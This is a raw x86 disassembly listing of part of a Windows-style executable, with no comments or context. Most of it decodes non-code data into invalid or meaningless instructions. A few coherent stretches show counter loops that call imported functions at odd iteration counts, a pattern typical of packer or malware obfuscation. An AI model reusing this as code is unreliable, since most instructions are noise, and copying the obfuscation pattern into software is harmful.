  40a345:	xchg   BYTE PTR [edi],dh
  40a347:	(bad)  
  40a348:	adc    al,0x2e
  40a34a:	(bad)  
  40a34b:	jecxz  0x40a3c5
  40a34d:	jge    0x40a35f
  40a34f:	xchg   edx,eax
  40a350:	bound  eax,QWORD PTR [ebp+0x7f]
  40a353:	and    DWORD PTR [ebp+ebp*2+0x42],ebp
  40a357:	sub    al,0xdd
  40a359:	xor    al,0x1
  40a35b:	sbb    DWORD PTR [ecx],ebp
  40a35d:	xchg   ecx,eax
  40a35e:	addr16 xchg ebx,eax
  40a360:	cmp    BYTE PTR [edx],cl
  40a362:	sub    BYTE PTR [eax+0x33ec2a9b],cl
  40a368:	into   
  40a369:	fucomp st(4)
  40a36b:	std    
  40a36c:	jl     0x40a30f
  40a36e:	pop    eax
  40a36f:	push   ecx
  40a370:	call   FWORD PTR [esi+0x554554e4]
  40a376:	jecxz  0x40a372
  40a378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a379:	(bad)  
  40a37a:	mov    cl,0x3e
  40a37c:	dec    edi
  40a37d:	adc    esi,DWORD PTR [eax-0x7d6a5ce5]
  40a383:	fisub  WORD PTR [edi-0x783f25e3]
  40a389:	popa   
  40a38a:	test   bl,cl
  40a38c:	mov    ebx,0xc6d86d50
  40a391:	scas   eax,DWORD PTR es:[edi]
  40a392:	or     BYTE PTR [esp+ebp*2],ah
  40a395:	inc    esi
  40a396:	xchg   ebx,eax
  40a397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a398:	repz dec edi
  40a39a:	xor    al,0xa
  40a39c:	push   edi
  40a39d:	out    dx,al
  40a39e:	xchg   edi,eax
  40a39f:	mov    ah,0x39
  40a3a1:	pop    edx
  40a3a2:	outs   dx,BYTE PTR ds:[esi]
  40a3a3:	(bad)  
  40a3a4:	enter  0x612d,0x69
  40a3a8:	and    al,0xa4
  40a3aa:	push   ss
  40a3ab:	in     al,dx
  40a3ac:	add    al,0xfd
  40a3ae:	lahf   
  40a3af:	mov    cl,0x95
  40a3b1:	mov    cl,0x7b
  40a3b3:	dec    edi
  40a3b4:	xor    cl,BYTE PTR [ecx]
  40a3b6:	push   ebx
  40a3b7:	in     eax,dx
  40a3b8:	jge    0x40a3b6
  40a3ba:	stos   DWORD PTR es:[edi],eax
  40a3bb:	add    ebx,DWORD PTR fs:[edi-0x1a]
  40a3bf:	test   BYTE PTR [edx-0x4d],ah
  40a3c2:	icebp  
  40a3c3:	dec    ecx
  40a3c4:	imul   ecx
  40a3c6:	mov    edx,0xb9253a19
  40a3cb:	arpl   WORD PTR [ebx],sp
  40a3cd:	push   edi
  40a3ce:	lahf   
  40a3cf:	retf   0xfb0d
  40a3d2:	addr16 inc edi
  40a3d4:	adc    BYTE PTR [edi-0x55],cl
  40a3d7:	pushf  
  40a3d8:	sahf   
  40a3d9:	in     al,dx
  40a3da:	mov    cl,0xe3
  40a3dc:	pop    ebx
  40a3dd:	(bad)  
  40a3de:	mov    esp,0x284c7b85
  40a3e3:	pop    eax
  40a3e4:	pop    eax
  40a3e5:	mov    WORD PTR [ebp-0x30],cs
  40a3e8:	sub    dh,ah
  40a3ea:	fimul  WORD PTR [esi]
  40a3ec:	jge    0x40a45c
  40a3ee:	das    
  40a3ef:	or     al,0xb
  40a3f1:	mov    bh,0xfc
  40a3f3:	out    dx,eax
  40a3f4:	aas    
  40a3f5:	loopne 0x40a454
  40a3f7:	push   es
  40a3f8:	cmp    bh,al
  40a3fa:	inc    ebp
  40a3fb:	aam    0x3b
  40a3fd:	test   DWORD PTR [eax+edi*8+0x3ad045c7],ebx
  40a404:	test   DWORD PTR [eax+edi*8+0x45c7ff0b],ebx
  40a40b:	int3   
  40a40c:	cmp    eax,0x1bf89c85
  40a411:	cmp    eax,0x434707
  40a416:	mov    DWORD PTR [ebp-0x38],0xf89c853c
  40a41d:	mov    DWORD PTR ds:0x434673,0x13
  40a427:	cmp    DWORD PTR ds:0x434673,0x0
  40a42e:	je     0x40a4bc
  40a434:	cmp    DWORD PTR ds:0x434673,0x21
  40a43b:	jne    0x40a44c
  40a441:	push   0x43478f
  40a446:	call   DWORD PTR ds:0x413338
  40a44c:	xor    edi,edi
  40a44e:	xor    edi,DWORD PTR ds:0x434673
  40a454:	dec    edi
  40a455:	mov    DWORD PTR ds:0x434673,edi
  40a45b:	jmp    0x40a427
  40a460:	and    DWORD PTR ds:0x43477b,0x0
  40a46a:	mov    edx,DWORD PTR ds:0x43477b
  40a470:	inc    edx
  40a471:	mov    DWORD PTR ds:0x43477b,edx
  40a477:	cmp    DWORD PTR ds:0x43477b,0x21
  40a47e:	jne    0x40a4a9
  40a484:	push   0x18fd
  40a489:	push   0x7257
  40a48e:	push   DWORD PTR [ebp-0xc]
  40a491:	push   0x434737
  40a496:	push   0x5f6e
  40a49b:	push   DWORD PTR [ebp-0xc]
  40a49e:	push   0x434a27
  40a4a3:	call   DWORD PTR ds:0x41333c
  40a4a9:	cmp    DWORD PTR ds:0x43477b,0x15
  40a4b0:	jb     0x40a46a
  40a4b6:	or     DWORD PTR ds:0x4346cb,ebx
  40a4bc:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40a4c3:	sbb    edi,0x2ba6
  40a4c9:	mov    edx,DWORD PTR [ebp+0x8]
  40a4cc:	xor    edx,eax
  40a4ce:	sub    DWORD PTR ds:0x434713,ecx
  40a4d4:	mov    edi,DWORD PTR [ebp-0x10]
  40a4d7:	or     DWORD PTR ds:0x4346d3,0x4346cf
  40a4e1:	add    edx,ecx
  40a4e3:	cmp    edi,edx
  40a4e5:	je     0x40e6c9
  40a4eb:	mov    DWORD PTR ds:0x4346f7,0x7850
  40a4f5:	push   ebx
  40a4f6:	jmp    0x40de76
  40a4fb:	xor    DWORD PTR ds:0x4346f7,0x535d
  40a505:	mov    edx,DWORD PTR [ebp-0x8]
  40a508:	add    DWORD PTR ds:0x434783,edx
  40a50e:	mov    edi,DWORD PTR [ebp-0x10]
  40a511:	add    DWORD PTR ds:0x43474b,0x4346fb
  40a51b:	sub    edi,edx
  40a51d:	mov    DWORD PTR ds:0x4346cf,0x500e
  40a527:	mov    edx,DWORD PTR [ebp-0x4]
  40a52a:	and    DWORD PTR ds:0x4346cf,0x1370
  40a534:	xor    edx,eax
  40a536:	add    DWORD PTR ds:0x434673,0x35ec
  40a540:	add    edx,ecx
  40a542:	mov    DWORD PTR ds:0x43467b,0xac0
  40a54c:	cmp    edi,edx
  40a54e:	mov    DWORD PTR ds:0x43477b,0x5818
  40a558:	jb     0x40e2b1
  40a55e:	mov    ebx,DWORD PTR ds:0x434797
  40a564:	mov    edx,DWORD PTR ds:0x4347a7
  40a56a:	sub    ebx,edx
  40a56c:	xor    ebx,DWORD PTR [ebx+edx*1]
  40a56f:	mov    edx,DWORD PTR [ebp-0x28]
  40a572:	mov    edi,DWORD PTR [ebp-0x4]
  40a575:	and    DWORD PTR ds:0x4346bf,0x0
  40a57f:	mov    ebx,DWORD PTR ds:0x4346bf
  40a585:	inc    ebx
  40a586:	mov    DWORD PTR ds:0x4346bf,ebx
  40a58c:	cmp    DWORD PTR ds:0x4346bf,0x9
  40a593:	jne    0x40a5a2
  40a599:	push   DWORD PTR [ebp-0x20]
  40a59c:	call   DWORD PTR ds:0x413340
  40a5a2:	cmp    DWORD PTR ds:0x4346bf,0x8
  40a5a9:	jne    0x40a5bc
  40a5af:	mov    ebx,DWORD PTR ds:0x4346bf
  40a5b5:	inc    ebx
  40a5b6:	mov    DWORD PTR ds:0x4346bf,ebx
  40a5bc:	cmp    DWORD PTR ds:0x4346bf,0x1c
  40a5c3:	jb     0x40a57f
  40a5c9:	xor    edx,eax
  40a5cb:	inc    ebx
  40a5cc:	xor    edi,eax
  40a5ce:	sbb    ebx,DWORD PTR ds:0x4346ff
  40a5d4:	add    edi,ecx
  40a5d6:	or     DWORD PTR ds:0x4346b7,ecx
  40a5dc:	add    edx,ecx
  40a5de:	imul   edx,edi
  40a5e1:	mov    edi,DWORD PTR [ebp-0x8]
  40a5e4:	mov    DWORD PTR ds:0x4346cb,0x1b
  40a5ee:	cmp    DWORD PTR ds:0x4346cb,0x0
  40a5f5:	je     0x40a629
  40a5fb:	cmp    DWORD PTR ds:0x4346cb,0x1d
  40a602:	jne    0x40a611
  40a608:	push   DWORD PTR [ebp-0x10]
  40a60b:	call   DWORD PTR ds:0x413404
  40a611:	mov    ebx,DWORD PTR ds:0x4346cb
  40a617:	dec    ebx
  40a618:	mov    DWORD PTR ds:0x4346cb,ebx
  40a61e:	jmp    0x40a5ee
  40a623:	and    DWORD PTR ds:0x434747,ecx
  40a629:	mov    ebx,DWORD PTR [ebp-0x10]
  40a62c:	sub    ebx,edi
  40a62e:	cmp    ebx,edx
  40a630:	mov    DWORD PTR ds:0x4346bf,0x5ce6
  40a63a:	ja     0x40aa85
  40a640:	xor    edx,edx
  40a642:	add    edx,DWORD PTR ds:0x43473f
  40a648:	add    DWORD PTR ds:0x434793,edx
  40a64e:	mov    edx,DWORD PTR [ebp-0x4]
  40a651:	or     DWORD PTR ds:0x4346ff,0x434787
  40a65b:	jmp    0x40aa72
  40a660:	xchg   edx,eax
  40a661:	dec    ebx
  40a662:	in     al,0xe
  40a664:	in     eax,dx
  40a665:	test   eax,0x2c38537c
  40a66a:	out    0x8f,eax
  40a66c:	jae    0x40a6b7
  40a66e:	xchg   ebp,eax
  40a66f:	push   0x7e7ef2fa
  40a674:	jo     0x40a6ef
  40a676:	jle    0x40a6f6
  40a678:	sbb    DWORD PTR [edx],0x5d
  40a67b:	scas   al,BYTE PTR es:[edi]
  40a67c:	cmp    edi,ebp
  40a67e:	out    dx,eax
  40a67f:	adc    al,cl
  40a681:	xchg   edi,ecx
  40a683:	jmp    0xf560:0x69ff97b0
  40a68a:	fistp  WORD PTR [edx]
  40a68c:	xchg   edi,eax
  40a68d:	lods   al,BYTE PTR ds:[esi]
  40a68e:	sub    al,0x22
  40a690:	push   0xc81e2d15
  40a695:	mov    ecx,0xbed3e0d5
  40a69a:	xchg   edx,eax
  40a69b:	xlat   BYTE PTR ds:[ebx]
  40a69c:	shl    BYTE PTR [edi-0x3b],0x6e
  40a6a0:	fs popf 
  40a6a2:	fstp   QWORD PTR [ebx+0x3]
  40a6a5:	mov    ebx,0x52c5f53a
  40a6aa:	ret    
  40a6ab:	xchg   ebx,eax
  40a6ac:	sbb    BYTE PTR [edi],dh
  40a6ae:	and    DWORD PTR [esi-0x4b],ecx
  40a6b1:	rol    BYTE PTR [edi-0x28a7343e],1
  40a6b7:	call   0xac0e03ce
  40a6bc:	aas    
  40a6bd:	mov    eax,ds:0x7395ce52
  40a6c2:	fst    QWORD PTR [eax-0x39]
  40a6c5:	inc    esi
  40a6c6:	fld    DWORD PTR [esi-0x6d427342]
  40a6cc:	call   0x27f1:0x87cd5cf
  40a6d3:	in     eax,0x1e
  40a6d5:	call   0x69b7ea7f
  40a6da:	fmul   QWORD PTR [edx]
  40a6dc:	add    esp,esi
  40a6de:	hlt    
  40a6df:	ret    
  40a6e0:	push   ds
  40a6e1:	mov    DWORD PTR [ebx-0x53],eax
  40a6e4:	stos   DWORD PTR es:[edi],eax
  40a6e5:	jno    0x40a757
  40a6e7:	test   DWORD PTR [edx-0x48],edx
  40a6ea:	fsubr  DWORD PTR [edx]
  40a6ec:	mov    esi,0xf10dd2c9
  40a6f1:	loopne 0x40a74f
  40a6f3:	or     eax,0x1a12da30
  40a6f8:	mov    ebx,DWORD PTR [eax-0x5bc162b]
  40a6fe:	mov    al,ds:0x2f6ec3d4
  40a703:	mov    ?,WORD PTR [esi]
  40a705:	cmp    al,0xe0
  40a707:	jle    0x40a73c
  40a709:	loopne 0x40a6ef
  40a70b:	dec    edi
  40a70c:	adc    DWORD PTR [edi+0x6a],esi
  40a70f:	xchg   ebx,eax
  40a710:	mov    ebx,0x79ce1d9a
  40a715:	add    DWORD PTR [ebp+ebx*2-0x57480ae1],esp
  40a71c:	xchg   ebx,eax
  40a71d:	sbb    DWORD PTR [eax+0x38],ebp
  40a720:	ds and eax,0xeb8eccb8
  40a726:	mov    al,0xff
  40a728:	inc    eax
  40a729:	mov    ebp,0x2be7d3b9
  40a72e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a72f:	mov    ah,0xfb
  40a731:	mov    ch,0xb
  40a733:	shl    dl,1
  40a735:	sahf   
  40a736:	sti    
  40a737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a738:	inc    esi
  40a739:	sahf   
  40a73a:	add    BYTE PTR [esp+eiz*2-0x7b],dl
  40a73e:	stos   DWORD PTR es:[edi],eax
  40a73f:	dec    edi
  40a740:	mov    edi,ebx
  40a742:	cmp    eax,0x75d7e5c1
  40a747:	jp     0x40a791
  40a749:	inc    ecx
  40a74a:	shr    BYTE PTR [edx-0xdec19ba],1
  40a750:	add    eax,0xbb366024
  40a755:	call   0xe79c:0x2e3f3f4f
  40a75c:	push   edi
  40a75d:	or     eax,0xff3df6b3
  40a762:	or     DWORD PTR [edx+0xd],esi
  40a765:	mov    dh,0xf2
  40a767:	dec    ebx
  40a768:	pop    ebp
  40a769:	je     0x40a703
  40a76b:	sub    al,BYTE PTR [edi+0x12]
  40a76e:	xor    dh,BYTE PTR [ebp+0x2f2e922d]
  40a774:	loope  0x40a7a1
  40a776:	into   
  40a777:	lods   al,BYTE PTR ds:[esi]
  40a778:	arpl   WORD PTR [ebp+0x29b508b8],ax
  40a77e:	cmp    eax,0x550a9794
  40a783:	sbb    bl,cl
  40a785:	adc    bh,dh
  40a787:	(bad)  
  40a788:	xchg   edi,eax
  40a789:	inc    ebp
  40a78a:	and    eax,0x9a4d8a2f
  40a78f:	out    0xb8,al
  40a791:	outs   dx,BYTE PTR ds:[esi]
  40a792:	retf   
  40a793:	sar    DWORD PTR [ecx+0x6b87bc95],cl
  40a799:	fst    st(4)
  40a79b:	or     eax,0xe92481b8
  40a7a0:	mov    edi,0x2e457ace
  40a7a5:	adc    BYTE PTR [eax-0x1b],ch
  40a7a8:	sub    esp,DWORD PTR [ebx]
  40a7aa:	dec    ecx
  40a7ab:	retf   0x37be
  40a7ae:	lods   al,BYTE PTR ds:[esi]
  40a7af:	ret    0x9382
  40a7b2:	shl    BYTE PTR [edx],cl
  40a7b4:	mov    edi,0xaf97d67e
  40a7b9:	outs   dx,DWORD PTR ds:[esi]
  40a7ba:	pop    ss
  40a7bb:	call   0xd917:0xfe948f2a
  40a7c2:	jge    0x40a768
  40a7c4:	lahf   
  40a7c5:	xor    al,0xe6
  40a7c7:	cwde   
  40a7c8:	xchg   al,bl
  40a7ca:	pusha  
  40a7cb:	test   BYTE PTR [edi-0x68],bh
  40a7ce:	or     esp,eax
  40a7d0:	cmc    
  40a7d1:	mov    bl,0x4f
  40a7d3:	shl    BYTE PTR [esi-0x21],cl
  40a7d6:	cs sub cl,ah
  40a7d9:	and    DWORD PTR [esi+0x3e94326f],eax
  40a7df:	pushf  
  40a7e0:	add    al,0xe1
  40a7e2:	scas   eax,DWORD PTR es:[edi]
  40a7e3:	sbb    al,0x12
  40a7e5:	cmp    eax,0x1335c0d9
  40a7ea:	xor    DWORD PTR [esi],edi
  40a7ec:	loop   0x40a858
  40a7ee:	int3   
  40a7ef:	dec    eax
  40a7f0:	es jo  0x40a774
  40a7f3:	sbb    dh,BYTE PTR [ebx]
  40a7f5:	sbb    eax,0xbe0ce863
  40a7fa:	xor    al,0x4b
  40a7fc:	mov    esi,0xa620ae5
  40a801:	cmp    BYTE PTR [ebx+0x49c3568c],0x46
  40a808:	sbb    eax,0x654a3056
  40a80d:	retf   0xacc1
  40a810:	add    DWORD PTR [edi],edi
  40a812:	pop    ebp
  40a813:	stc    
  40a814:	sub    ah,dh
  40a816:	popf   
  40a817:	xchg   BYTE PTR [eax],ah
  40a819:	mov    eax,ds:0x44183e38
  40a81e:	cmp    eax,0xfc5e1dd6
  40a823:	inc    edi
  40a824:	mov    esp,0xa8a334fe
  40a829:	je     0x40a834
  40a82b:	jmp    0x7a4418a5
  40a830:	mov    ebx,DWORD PTR [edi-0x3a]
  40a833:	(bad)  
  40a834:	repnz adc BYTE PTR [edx],dh
  40a837:	mov    edi,0x6bf4e080
  40a83c:	cs inc esi
  40a83e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a83f:	push   ebp
  40a840:	lock imul ecx,DWORD PTR [ebx],0x445c0cb
  40a847:	xor    DWORD PTR [edx],edx
  40a849:	xchg   ecx,eax
  40a84a:	bound  ecx,QWORD PTR [eax-0x59]
  40a84d:	int3   
  40a84e:	inc    ecx
  40a84f:	fdivrp st(0),st
  40a851:	call   0xd4582eb7
  40a856:	bound  ebx,QWORD PTR [esi]
  40a858:	sub    eax,0x59c8f427
  40a85d:	scas   eax,DWORD PTR es:[edi]
  40a85e:	shl    DWORD PTR [esi+0x433b7115],1
  40a864:	aaa    
  40a865:	daa    
  40a866:	jecxz  0x40a8a6
  40a868:	dec    esp
  40a869:	inc    ebp
  40a86a:	(bad)  
  40a86b:	sub    ecx,DWORD PTR [ecx-0x2d42a83b]
  40a871:	iret   
  40a872:	jb     0x40a858
  40a874:	stos   BYTE PTR es:[edi],al
  40a875:	fld    DWORD PTR [edx+0x1792440e]
  40a87c:	pop    ds
  40a87d:	lods   eax,DWORD PTR ds:[esi]
  40a87e:	push   0xb
  40a880:	or     esi,DWORD PTR [edx]
  40a882:	add    esp,DWORD PTR [ebx]
  40a884:	sahf   
  40a885:	fwait
  40a886:	push   edx
  40a887:	mov    eax,0xb26f3ec
  40a88c:	or     DWORD PTR [edi+ebx*2-0x625e39ca],edx
  40a893:	push   ss
  40a894:	xchg   BYTE PTR [edx+0x18],dl
  40a897:	(bad)  
  40a898:	cmp    bh,bl
  40a89a:	or     ecx,DWORD PTR ds:0xcfdc8a86
  40a8a0:	mov    eax,ds:0xf0621b07
  40a8a5:	js     0x40a8c5
  40a8a7:	(bad)  
  40a8a8:	out    0xcb,eax
  40a8aa:	lods   al,BYTE PTR ds:[esi]
  40a8ab:	or     ah,BYTE PTR [ebx-0x2d609226]
  40a8b1:	mov    ah,0x9e
  40a8b3:	call   0xa5f3:0x7248ea5
  40a8ba:	or     eax,0xe32c1f0f
  40a8bf:	test   edi,edx
  40a8c1:	sub    ch,dl
  40a8c3:	adc    dh,dh
  40a8c5:	lds    ebp,FWORD PTR [edx]
  40a8c7:	and    eax,0x6fb1f4bb
  40a8cc:	das    
  40a8cd:	mov    ds:0x6dca3369,eax
  40a8d2:	hlt    
  40a8d3:	mov    al,0x60
  40a8d5:	lea    esp,[edi]
  40a8d7:	aam    0xcf
  40a8d9:	pusha  
  40a8da:	test   al,0xb5
  40a8dc:	push   ebp
  40a8dd:	dec    eax
  40a8de:	sbb    al,0x2b
  40a8e0:	xchg   ebx,eax
  40a8e1:	int    0xb
  40a8e3:	(bad)  
  40a8e4:	dec    DWORD PTR [edx]
  40a8e6:	xchg   ecx,eax
  40a8e7:	and    al,0xdf
  40a8e9:	mov    ebx,0x817af398
  40a8ee:	xchg   esi,eax
  40a8ef:	lods   eax,DWORD PTR ds:[esi]
  40a8f0:	retf   0x450a
  40a8f3:	sbb    dl,BYTE PTR [ebp+0x19]
  40a8f6:	jl     0x40a891
  40a8f8:	adc    eax,0x7742ebd9
  40a8fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8fe:	out    0xa5,eax
  40a900:	jbe    0x40a95c
  40a902:	mov    eax,gs:0x7621dbbe
  40a908:	stc    
  40a909:	cmp    BYTE PTR [ebx],bl
  40a90b:	add    DWORD PTR [esi],ebx
  40a90d:	mov    ds:0x148630de,eax
  40a912:	pop    ecx
  40a913:	dec    esi
  40a914:	fcom   st(2)
  40a916:	adc    eax,0xd099caa4
  40a91b:	retf   0x4b22
  40a91e:	hlt    
  40a91f:	out    0xd2,al
  40a921:	mov    al,0xb7
  40a923:	les    esi,FWORD PTR [ecx+0x6c]
  40a926:	test   al,0x76
  40a928:	dec    ecx
  40a929:	int    0xc1
  40a92b:	adc    DWORD PTR [eax-0x7d],esp
  40a92e:	cmp    dl,cl
  40a930:	data16 shl WORD PTR [edi],0x4
  40a935:	xchg   esi,eax
  40a936:	ss int 0xac
  40a939:	fisub  DWORD PTR [eiz*4+0x7b860f0f]
  40a940:	push   0x38a64d5b
  40a945:	mov    dl,0x43
  40a947:	jl     0x40a8d0
  40a949:	imul   ebp,ecx,0xffffffd6
  40a94c:	cmp    esp,DWORD PTR [edx+edx*2-0x2a]
  40a950:	mov    ebp,0xa55a21ef
  40a955:	xchg   ebp,eax
  40a956:	and    eax,0xf13d7fc0
  40a95b:	sti    
  40a95c:	xor    al,bh
  40a95e:	xor    al,0x73
  40a960:	mov    edi,0x8b9e573e
  40a965:	hlt    
  40a966:	xchg   DWORD PTR [ebx],ebp
  40a968:	push   edi
  40a969:	mov    eax,0x9ca0b6d7
  40a96e:	fstp   DWORD PTR [edx+0x7a8d83c1]
  40a974:	jns    0x40a960
  40a976:	xlat   BYTE PTR ds:[ebx]
  40a977:	cmp    DWORD PTR [esi+0x29951995],edi
  40a97d:	add    esp,ebp
  40a97f:	aaa    
  40a980:	lock add ebp,0xffffffcf
  40a984:	stc    
  40a985:	es std 
  40a987:	cmp    DWORD PTR [ebx-0x3],ecx
  40a98a:	mov    ecx,0x52a371
  40a98f:	jns    0x40a982
  40a991:	push   ebp
  40a992:	xor    ch,BYTE PTR [ebx+ebx*1-0xdcbe98d]
  40a999:	mov    al,0xf1
  40a99b:	ins    BYTE PTR es:[edi],dx
  40a99c:	dec    eax
  40a99d:	pop    eax
  40a99e:	jecxz  0x40a92b
  40a9a0:	mov    cl,0x6e
  40a9a2:	aas    
  40a9a3:	ret    0xb377
  40a9a6:	js     0x40a9a2
  40a9a8:	rol    DWORD PTR ds:[ebx+edi*8+0x5b],0x51
  40a9ae:	add    BYTE PTR [ecx+ebp*8+0x5d68d7d8],bh
  40a9b5:	cs inc esi
  40a9b7:	mov    ecx,edi
  40a9b9:	mov    esp,ebx
  40a9bb:	jl     0x40aa21
  40a9bd:	test   al,0x9b
  40a9bf:	jle    0x40aa19
  40a9c1:	dec    eax
  40a9c2:	inc    ebp
  40a9c3:	out    dx,al
  40a9c4:	ss popf 
  40a9c6:	iret   
  40a9c7:	fbstp  TBYTE PTR [edx+0x2a411b56]
  40a9cd:	aaa    
  40a9ce:	mov    al,ds:0x32d490b9
  40a9d3:	aad    0x23
  40a9d5:	aaa    
  40a9d6:	adc    BYTE PTR ds:0x2a31dfff,dh
  40a9dc:	jnp    0x40a975
  40a9de:	add    DWORD PTR [edx],esi
  40a9e0:	hlt    
  40a9e1:	inc    ebx
  40a9e2:	loop   0x40a9a2
  40a9e4:	retf   0xf971
  40a9e7:	icebp  
  40a9e8:	in     eax,dx
  40a9e9:	adc    DWORD PTR [ebp-0x6e],ecx
  40a9ec:	add    DWORD PTR [eax-0x4a019f30],0x40
  40a9f3:	mul    esp
  40a9f5:	ret    
  40a9f6:	cmp    BYTE PTR es:[esi-0x25],0x90
  40a9fb:	jne    0x40aa37
  40a9fd:	or     DWORD PTR [ebx+ecx*2+0x61],0xffffffd7
  40aa02:	ror    BYTE PTR [ebx],cl
  40aa04:	in     eax,dx
  40aa05:	pop    edi
  40aa06:	sub    eax,0x7ff7788
  40aa0b:	ins    DWORD PTR es:[edi],dx
  40aa0c:	mov    esi,0xd4677ff8
  40aa11:	test   eax,0x87e5e3dd
  40aa16:	loop   0x40aa1d
  40aa18:	aaa    
  40aa19:	es jecxz 0x40aa0f
  40aa1c:	out    0x5b,eax
  40aa1e:	pushf  
  40aa1f:	arpl   WORD PTR [ecx],bx
  40aa21:	out    dx,al
  40aa22:	dec    esp
  40aa23:	xor    ecx,DWORD PTR [ecx+0x7cb214a1]
  40aa29:	sbb    BYTE PTR [ebp-0x54211985],ah
  40aa2f:	jno    0x40aa4e
  40aa31:	fisttp DWORD PTR [esi*1-0x1226a33e]
  40aa38:	cmp    eax,0x477e87d5
  40aa3d:	pop    ebp
  40aa3e:	mov    BYTE PTR [edx],dh
  40aa40:	mov    cl,0x8
  40aa42:	cmp    edx,DWORD PTR [ecx+0x577fa72b]
  40aa48:	mov    ecx,0x594d3ae9
  40aa4d:	mov    eax,0x2172822b
  40aa52:	imul   edx,esp,0x5b40ef3b
  40aa58:	sub    DWORD PTR [esi+edx*8],esp
  40aa5b:	int3   
  40aa5c:	adc    eax,0xd6df1f89
  40aa61:	add    al,0x3b
  40aa63:	mov    esi,0x1b846ec6
  40aa68:	or     esi,DWORD PTR es:[esi+0x734b3ad2]
  40aa6f:	popa   
  40aa70:	std    
  40aa71:	dec    ebp
  40aa72:	xor    edx,eax
  40aa74:	adc    DWORD PTR ds:0x4346d3,0x4346ff
  40aa7e:	add    edx,ecx
  40aa80:	jmp    0x40c4f6
  40aa85:	mov    edx,DWORD PTR [ebp-0x2c]
  40aa88:	sub    DWORD PTR ds:0x434673,0x7416
  40aa92:	mov    edi,DWORD PTR [ebp-0x4]
  40aa95:	mov    ebx,DWORD PTR ds:0x43477b
  40aa9b:	sub    ebx,DWORD PTR ds:0x43478b
  40aaa1:	mov    DWORD PTR ds:0x43477b,ebx
  40aaa7:	xor    edx,eax
  40aaa9:	xor    edi,eax
  40aaab:	or     ebx,0x1288
  40aab1:	add    edi,ecx
  40aab3:	adc    ebx,DWORD PTR ds:0x43473b
  40aab9:	jmp    0x40aed0
  40aabe:	test   DWORD PTR [eax-0x4c324c3f],edi
  40aac4:	jne    0x40ab36
  40aac6:	xchg   ebx,eax
  40aac7:	in     eax,0x4e
  40aac9:	in     eax,dx
  40aaca:	arpl   di,si
  40aacc:	pusha  
  40aacd:	pop    ebp
  40aace:	cld    
  40aacf:	(bad)  
  40aad0:	jle    0x40ab50
  40aad2:	jo     0x40ab4d
  40aad4:	jle    0x40ab54
  40aad6:	int3   
  40aad7:	or     edx,DWORD PTR [edi]
  40aad9:	xchg   edx,eax
  40aada:	fst    DWORD PTR [edx]
  40aadc:	cli    
  40aadd:	imul   eax,DWORD PTR [eax+edx*1],0x3b2c4eee
  40aae4:	push   ss
  40aae5:	arpl   WORD PTR [esi+0x44eb60e8],bp
  40aaeb:	push   0xec6c8558
  40aaf0:	sub    DWORD PTR [ecx-0x4a],esi
  40aaf3:	jno    0x40ab51
  40aaf5:	jnp    0x40ab22
  40aaf7:	push   ds
  40aaf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaf9:	sar    BYTE PTR [ebx],0xcb
  40aafc:	rcr    ebx,1
  40aafe:	mov    esp,0x24548c3f
  40ab03:	or     al,0x43
  40ab05:	mov    edi,0xe35dd8f3
  40ab0a:	inc    eax
  40ab0b:	jecxz  0x40ab65
  40ab0d:	fimul  DWORD PTR [eax]
  40ab0f:	xlat   BYTE PTR ds:[ebx]
  40ab10:	or     esp,DWORD PTR [ebx-0x3d]
  40ab13:	lds    edx,FWORD PTR [edx]
  40ab15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab16:	mov    gs,WORD PTR [edx+0x79]
  40ab19:	push   cs
  40ab1a:	xor    DWORD PTR [ebp-0x80],ecx
  40ab1d:	sbb    eax,0x129bcd91
  40ab22:	call   0xa553:0xb35f0dfc
  40ab29:	leave  
  40ab2a:	outs   dx,DWORD PTR ds:[esi]
  40ab2b:	ss jl  0x40ab1d
  40ab2e:	mov    dh,0xed
  40ab30:	pop    ecx
  40ab31:	push   ebx
  40ab32:	xchg   ebp,eax
  40ab33:	inc    ecx
  40ab34:	ret    
  40ab35:	xchg   ebp,eax
  40ab36:	pop    ebx
  40ab37:	fsub   st,st(6)
  40ab39:	neg    BYTE PTR [eax]
  40ab3b:	xor    al,0x1f
  40ab3d:	mov    ecx,0x954aa6b3
  40ab42:	test   DWORD PTR [ebp+0x5ec9a0],0xff4f756d
  40ab4c:	add    DWORD PTR [ecx+edi*4],0xffffffd8
  40ab50:	mov    ch,0x11
  40ab52:	shl    BYTE PTR [ecx-0x3940ae14],1
  40ab58:	sub    eax,0x717f260e
  40ab5d:	mov    dl,0x51
  40ab5f:	jp     0x40ab76
  40ab61:	ror    DWORD PTR [ecx],0x3
  40ab64:	js     0x40aba6
  40ab66:	sub    DWORD PTR [eax-0x3e5a0666],ebp
  40ab6c:	fsub   DWORD PTR [ecx-0x469633ba]
  40ab72:	xchg   esi,eax
  40ab73:	adc    DWORD PTR es:[ecx],edi
  40ab76:	sar    BYTE PTR [ecx-0x62],cl
  40ab79:	aas    
  40ab7a:	pop    edx
  40ab7b:	add    al,0xf1
  40ab7d:	ret    0x76b5
  40ab80:	or     eax,0xd1bbdad6
  40ab85:	and    DWORD PTR [edi-0x7709e53],edi
  40ab8b:	ss out dx,al
  40ab8d:	cmp    BYTE PTR [ecx+0x45bf80fc],dl
  40ab93:	jg     0x40ab64
  40ab95:	push   ss
  40ab96:	sub    BYTE PTR [esi],ch
  40ab98:	jp     0x40abf3
  40ab9a:	(bad)  [ecx+0x3f]
  40ab9d:	mov    dl,al
  40ab9f:	fnstcw WORD PTR [ebx+0x581e20c4]
  40aba5:	xchg   ebx,eax
  40aba6:	scas   eax,DWORD PTR es:[edi]
  40aba7:	int3   
  40aba8:	in     eax,dx
  40aba9:	jb     0x40ac0d
  40abab:	dec    ebx
  40abac:	mov    edx,0xa16c1935
  40abb1:	iret   
  40abb2:	pop    esp
  40abb3:	test   al,0xf3
  40abb5:	mov    dl,0xe3
  40abb7:	cs mov esi,0xcc5ff065
  40abbd:	mov    BYTE PTR [edi],ah
  40abbf:	into   
  40abc0:	inc    ecx
  40abc1:	xchg   ecx,eax
  40abc2:	pop    es
  40abc3:	jo     0x40abf0
